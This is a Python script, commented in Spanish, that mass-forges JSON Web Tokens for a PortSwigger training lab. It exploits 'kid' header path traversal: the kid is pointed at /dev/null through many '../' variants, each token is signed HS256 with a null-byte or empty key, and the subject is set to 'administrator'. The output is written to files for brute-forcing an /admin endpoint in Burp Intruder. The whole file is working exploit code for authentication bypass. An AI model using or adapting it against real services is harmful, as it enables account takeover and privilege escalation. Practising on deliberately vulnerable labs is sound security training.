#!/usr/bin/env python3
"""
Forja en masa los JWT del lab "kid path traversal" (JWT 006).

Idea: el server usa el header `kid` como RUTA DE ARCHIVO para cargar la clave
HMAC. Si apuntas `kid` a /dev/null (archivo vacio, contenido conocido) y firmas
con la clave "vacia", la firma valida. Como no sabes cuantos `../` hacen falta,
este script prueba TODAS las profundidades/variantes de la wordlist de path
traversal, apuntando cada una a /dev/null, y te deja un archivo con todos los
JWT listos para pegar en Burp Intruder o probar de a uno.

- Se para sobre la ruta del script y SUBE carpetas hasta encontrar la wordlist:
      vulnerabilities/010-path-transversal/wordlists/deep_traversal.txt
- Reemplaza el placeholder {FILE} (o {PATH}) por el objetivo (default: dev/null).
- Firma HS256 con las claves candidatas de /dev/null (AA== y vacia).
- Escribe out/kid-traversal-jwts.txt (uno por linea) + una version anotada.

Uso tipico (sin argumentos: payload minimo sub=administrator):
    python forge_kid_traversal_jwts.py

Con tu token real (recomendado: conserva iss/exp del lab y solo cambia sub):
    python forge_kid_traversal_jwts.py --jwt "eyJ...tu.jwt.actual"

Usar TODAS las variantes de la wordlist (incluye encodings raros):
    python forge_kid_traversal_jwts.py --mode all
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import sys

# ==========================================================
#  PEGA AQUI (opcional) - lo mismo se puede pasar por CLI
# ==========================================================
# Opcion A: pega el BODY (payload) JSON tal cual, para PISAR tu JWT
#           conservando tus claims (exp, iss, roles...). Se usa verbatim
#           y solo se le pisa "sub" (salvo --no-sub-override).
PAYLOAD_JSON = r"""
"""

# Opcion B: pega tu JWT COMPLETO (header.payload.signature); se le extrae
#           el body y se re-firma. Si pegaste PAYLOAD_JSON, este se ignora.
JWT_ACTUAL = ""
# ==========================================================

# Nombre de la wordlist y su ruta relativa dentro del repo
WORDLIST_REL = os.path.join(
    "vulnerabilities", "010-path-transversal", "wordlists", "deep_traversal.txt"
)

# Claves candidatas para /dev/null (archivo vacio).
#   AA==  -> base64 de un byte nulo (respuesta canonica de PortSwigger)
#   ""    -> contenido literal de /dev/null (vacio)
# Generamos con las dos para cubrir como interpreta el server el contenido.
DEVNULL_KEYS = [
    ("k=AA==(nullbyte)", b"\x00"),
    ("k=vacia(empty)", b""),
]


# ----------------------------------------------------------------------
#  Helpers base64url / firma
# ----------------------------------------------------------------------
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(seg: str) -> bytes:
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode("ascii"))


def sign_hs256(header: dict, payload: dict, key: bytes) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = (h + "." + p).encode("ascii")
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return h + "." + p + "." + b64url_encode(sig)


# ----------------------------------------------------------------------
#  Localizar la wordlist subiendo carpetas
# ----------------------------------------------------------------------
def find_wordlist() -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    current = here
    while True:
        candidate = os.path.join(current, WORDLIST_REL)
        if os.path.isfile(candidate):
            return candidate
        parent = os.path.dirname(current)
        if parent == current:  # llegamos a la raiz del disco
            sys.exit(
                "[!] No encontre la wordlist subiendo desde:\n    "
                + here
                + "\n    Buscaba: "
                + WORDLIST_REL
            )
        current = parent


# ----------------------------------------------------------------------
#  Construir la lista de kids (traversals -> dev/null)
# ----------------------------------------------------------------------
def build_kids(wordlist_path: str, target: str, mode: str) -> list:
    kids = []
    seen = set()

    def add(kid: str):
        if kid not in seen:
            seen.add(kid)
            kids.append(kid)

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            kid = line.replace("{FILE}", target).replace("{PATH}", target)

            if mode == "smart":
                # En un kid (string JSON) el server NO url-decodifica ni usa
                # backslash de Windows. Nos quedamos con traversals de path
                # "reales" para Linux: sin %, sin \, sin ; .
                low = kid
                if "%" in low or "\\" in low or ";" in low:
                    continue
            add(kid)

    # Ruta absoluta directa: muchos labs aceptan kid = /dev/null tal cual
    add("/" + target)
    return kids


# ----------------------------------------------------------------------
#  Base del JWT (header/payload)
# ----------------------------------------------------------------------
def _parse_body(raw: str, src: str) -> dict:
    try:
        body = json.loads(raw)
    except json.JSONDecodeError as e:
        sys.exit("[!] El body JSON (%s) no es valido: %s" % (src, e))
    if not isinstance(body, dict):
        sys.exit("[!] El body JSON (%s) debe ser un objeto {...}" % src)
    return body


def base_header_payload(args) -> tuple:
    """Devuelve (header, payload, fuente). Precedencia de fuentes del payload:
    --payload > --payload-file > PAYLOAD_JSON(pegado) > --jwt / JWT_ACTUAL > default.
    Cuando pegas un BODY, el header se arma fresco {alg:HS256}; cuando pegas un
    JWT completo, se conserva su header (y se le fuerza alg=HS256).
    """
    header = {"alg": "HS256"}
    payload = None
    source = None

    if args.payload:
        payload, source = _parse_body(args.payload, "--payload"), "--payload"
    elif args.payload_file:
        with open(args.payload_file, "r", encoding="utf-8") as fh:
            payload = _parse_body(fh.read(), args.payload_file)
        source = args.payload_file
    elif PAYLOAD_JSON.strip():
        payload = _parse_body(PAYLOAD_JSON, "PAYLOAD_JSON (pegado en el script)")
        source = "PAYLOAD_JSON (pegado en el script)"

    if payload is None:
        jwt = args.jwt or (JWT_ACTUAL.strip() or None)
        if jwt:
            parts = jwt.strip().split(".")
            if len(parts) != 3:
                sys.exit("[!] El JWT no tiene formato header.payload.signature")
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
            source = "JWT completo"
        else:
            payload = {"iss": "portswigger"}
            source = "payload minimo por defecto"

    header["alg"] = "HS256"  # forzamos HMAC pase lo que pase
    if not args.no_sub_override:
        payload["sub"] = args.sub  # el objetivo del ataque
    return header, payload, source


# ----------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="Forja JWTs para el lab kid path traversal (apunta kid a /dev/null)."
    )
    ap.add_argument(
        "--jwt",
        help="Tu JWT COMPLETO (header.payload.sig); conserva su header/body y re-firma.",
    )
    ap.add_argument(
        "--payload",
        help="Body JSON verbatim para PISAR tu JWT (ej: '{\"sub\":\"wiener\",\"exp\":123}').",
    )
    ap.add_argument(
        "--payload-file",
        help="Igual que --payload pero leyendo el JSON de un archivo.",
    )
    ap.add_argument(
        "--sub", default="administrator", help="Valor de sub (default: administrator)."
    )
    ap.add_argument(
        "--no-sub-override",
        action="store_true",
        help="Usa el body EXACTO como lo pegaste, sin pisar sub.",
    )
    ap.add_argument(
        "--target",
        default="dev/null",
        help="Archivo objetivo, SIN ../ inicial (default: dev/null).",
    )
    ap.add_argument(
        "--mode",
        choices=["smart", "all"],
        default="smart",
        help="smart = solo traversals utiles para un kid (default) | all = toda la wordlist.",
    )
    ap.add_argument(
        "--key",
        action="append",
        default=[],
        metavar="BASE64",
        help="Clave HMAC extra en base64 (repetible). Util si el objetivo no es /dev/null.",
    )
    ap.add_argument("--out", help="Archivo de salida (default: out/kid-traversal-jwts.txt).")
    args = ap.parse_args()

    base_dir = os.path.dirname(os.path.abspath(__file__))
    wordlist_path = find_wordlist()
    print("[*] Wordlist encontrada: " + wordlist_path)

    kids = build_kids(wordlist_path, args.target, args.mode)
    print("[*] kids generados (modo %s): %d" % (args.mode, len(kids)))

    header, payload, source = base_header_payload(args)
    print("[*] payload tomado de: " + source)
    print("[*] payload final -> " + json.dumps(payload, separators=(",", ":")))

    # Claves: las de /dev/null por default; si el objetivo cambio, usa las --key.
    if args.target == "dev/null":
        keys = list(DEVNULL_KEYS)
    else:
        keys = []
    for b64 in args.key:
        keys.append(("k=" + b64, b64url_decode(b64)))
    if not keys:
        sys.exit(
            "[!] Objetivo distinto de dev/null y sin --key: no se que clave usar.\n"
            "    Pasa la clave conocida del archivo con --key <base64>."
        )
    print("[*] claves candidatas: " + ", ".join(name for name, _ in keys))

    out_path = args.out or os.path.join(base_dir, "out", "kid-traversal-jwts.txt")
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    annotated_path = out_path.rsplit(".", 1)[0] + ".annotated.txt"

    tokens = []
    annotated = []
    for key_name, key_bytes in keys:
        for kid in kids:
            h = dict(header)
            h["kid"] = kid
            jwt = sign_hs256(h, payload, key_bytes)
            tokens.append(jwt)
            annotated.append("%-18s kid=%-45s %s" % (key_name, kid, jwt))

    with open(out_path, "w", encoding="utf-8") as f:
        f.write("\n".join(tokens) + "\n")
    with open(annotated_path, "w", encoding="utf-8") as f:
        f.write("\n".join(annotated) + "\n")

    print("-" * 60)
    print("[+] %d JWT escritos en:" % len(tokens))
    print("    " + out_path)
    print("    " + annotated_path + "  (con kid+clave al lado)")
    print("-" * 60)
    print("[*] Sugerencia rapida (el clasico de PortSwigger, k=AA==):")
    quick_header = dict(header)
    quick_header["kid"] = "../../../../../../../" + args.target
    print("    " + sign_hs256(quick_header, payload, b"\x00"))
    print("[*] En Burp: manda el request a /admin y prueba cada linea del .txt")
    print("    (Intruder: posicion en el header Authorization/cookie, payload = Simple list).")


if __name__ == "__main__":
    main()
